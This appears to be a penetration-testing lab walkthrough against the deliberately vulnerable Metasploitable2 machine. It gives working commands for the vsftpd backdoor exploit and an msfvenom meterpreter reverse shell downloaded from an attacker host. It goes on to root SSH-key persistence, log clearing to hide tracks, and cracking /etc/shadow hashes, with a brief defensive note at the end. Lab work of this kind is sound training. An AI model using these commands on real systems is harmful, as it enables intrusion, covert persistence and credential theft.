
# 2.1. Find the target and identify the vulnerability

Scan with Nmap from Kali to know the target IP on the network:

```
nmap -sn 192.168.56.0/24
```

![[Pasted image 20250211190103.png]]

Identify the ports opened and the services used by our target `192.168.56.107`. By default, nmap uses a `SYN scan`, which might be blocked by a firewall. Instead, try a `TCP Connect` scan:

```
nmap -sT 192.168.56.107
```

![[Pasted image 20250211190940.png]]

We will explore the service version of the protocol `ftp` in the port 21:
```
nmap -sV -p 21 192.168.56.107
```

![[Pasted image 20250211191406.png]]

We will try to find a vulnerability related to that service version in Metasploit. Run Metasploit in Kali:
```
msfconsole
```

```
search vsftpd
```

![[Pasted image 20250211191707.png]]

We know that there is an exploit for that protocol version. Let's exploit it!

# 2.2. Exploit the vulnerability

Select the exploit, set the parameters and check that all the options are correct:
```
use exploit/unix/ftp/vsftpd_234_backdoor
set TARGET 0
set RHOSTS 192.168.56.101
options
```

![[Pasted image 20250209200128.png]]

Exploit:
```
exploit
```

Successful exploitation provides a reverse command shell session as the root user (uid=0(root) gid=0(root)) on the target machine, allowing full control over the compromised service. For a more comfortable interface use:

```
script /dev/null -c bash
```

## 2.2.1. Read files from the target machine

In the target `Metasploitable2`, create the file `testfile.txt` with the following content:

```
Super secret condifential content

username Hello34
pwd 123456789
```


Now you could read files from the attacker `Kali linux`:

![[Pasted image 20250209200514.png]]

## 3. Post-exploitation

### 3.1. Upload files to the target machine

Use cases for uploading files:
- Deploying Backdoors – Installing persistent malware.
- Executing Scripts – Uploading batch, PowerShell, or Python scripts for automation.
- Privilege Escalation – Dropping exploits or DLL files.
- Data Exfiltration – Uploading tools for data collection and exfiltration.

A **payload** is the part of an exploit that executes malicious code on a target system after a vulnerability has been successfully exploited. It determines what happens after access is gained, such as opening a shell, executing commands, or creating a backdoor. **`msfvenom`** is used here to  **generate the payload** for this exploit.

#### **Types of Payloads in Metasploit**

1. **Singles** – Self-contained, executes a single action (e.g., add a user).
2. **Stagers** – Small, initial payloads that establish a connection and load larger payloads (e.g., `reverse_tcp`).
3. **Stages** – Larger payloads delivered by stagers (e.g., `meterpreter`).

In this example, it will be done the following:
- The attacker sends a small **stager** to the target (`reverse_tcp`).
- The stager connects back to the attacker's machine.
- It then downloads and executes the **stage** (`meterpreter`), which is the full payload.

### 3.1. Generate the payload

Generation of payload `reverse_tcp` with `msfvenon`:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<AttackerIp> LPORT=<PortSelected> -f elf -o hola
```

![[Pasted image 20250215104019.png]]

`hola` will be generated with the payload `linux/x86/meterpreter/reverse_tcp`, and the configuration of the ip and port to send the reverse shell. The file is created in the current directory. 
![[Pasted image 20250215104057.png]]

We need now a way to send the file to the target machine.

### 3.2. Upload download and execute the payload file
Create a server in the attackers machine so that the target machine can download the infected file from my current directory:
```
python -m http.server 80
```

![[Pasted image 20250214215337.png]]

Download the file in the target machine from the attacker machine:
```
wget http://<AttackerIp>/hola
```

![[Pasted image 20250215104137.png]]

Listen in the attacker machine. The multi/handler module in Metasploit is used to catch and interact with incoming connections from payloads like reverse shells or Meterpreter sessions. It's commonly used with msfvenom-generated payloads. Prepare Meterpreter listener:
```
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <AttackerIp>
set LPORT <PortSelected>
run
```

In the target machine run:
```
chmod +x hola
./hola
```

In the attacker machine you will see the meterpreter session open with the reverse shell:

![[Pasted image 20250215104444.png]]

## 3. Post-exploitation: Maintaining Access

After gaining access to a Linux system, **SSH key persistence** allows you to maintain access without relying on passwords or vulnerable services. This is commonly used in **post-exploitation** to create a stealthy backdoor.

### X. Generate the SSH Key
In the attacker machine, we generate a SSH Key:

```
mkdir ssh
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persist_key
```

![[Pasted image 20250215111433.png]]
This creates:
- Private Key: ~/.ssh/persist_key (Keep this safe! It's the attacker backdoor.)
- Public Key: ~/.ssh/persist_key.pub (To inject into the target.)

![[Pasted image 20250215111502.png]]

### X. Upload the public SSH Key to the target machine

Transfer the public key to the target: (placed in root to maintain root access)

```
upload persist_key.pub /root/.ssh/authorized_keys
```

![[Pasted image 20250215111820.png]]

Ensure root login via SSH is enabled in /etc/ssh/sshd_config:
```
PermitRootLogin yes
```

Restart SSH in the target machine:

```
sudo /etc/init.d/ssh restart
```

![[Pasted image 20250215113357.png]]


Check the port 

![[Pasted image 20250215115813.png]]

```
sudo ufw allow 22
```


![[Pasted image 20250215121301.png]]
### X. Connect any time

```
ssh -i ~/.ssh/persist_key root@target_ip
```

![[Pasted image 20250215133245.png]]

```
ssh -v -i ~/.ssh/persist_key -oHostKeyAlgorithms=ssh-rsa root@target_ip
```

![[Pasted image 20250215133412.png]]
we do not know the user password


```
ssh -v -i ~/.ssh/persist_key -oHostKeyAlgorithms=ssh-rsa -oPubKeyAcceptedKeyTypes=ssh-rsa root@target_ip
```

![[Pasted image 20250215133514.png]]


### X. Hide Your Tracks (Stealth)

Make the SSH key hidden:
```
chmod 400 ~/.ssh/authorized_keys
chattr +i ~/.ssh/authorized_keys  # Prevent deletion
```

To remove logs:

```
echo "" > ~/.bash_history
history -c
```


## X. Dumping User and Service Credentials

Get the content of the following files from the target machine:

```
/etc/shadow 
/etc/passwd
```

Then use unshadow to merge them:
```
unshadow passwd shadow > hashes.txt
```

![[Pasted image 20250215164528.png]]

Use John the Ripper
```
john hashes.txt
```

![[Pasted image 20250215164847.png]]


Detection & Prevention (to be added in the defensive measurements)

    Admins should monitor ~/.ssh/authorized_keys for unauthorized entries.
    Disable SSH root login (PermitRootLogin no).
    Use SSH key restrictions (e.g., command="restricted_command").
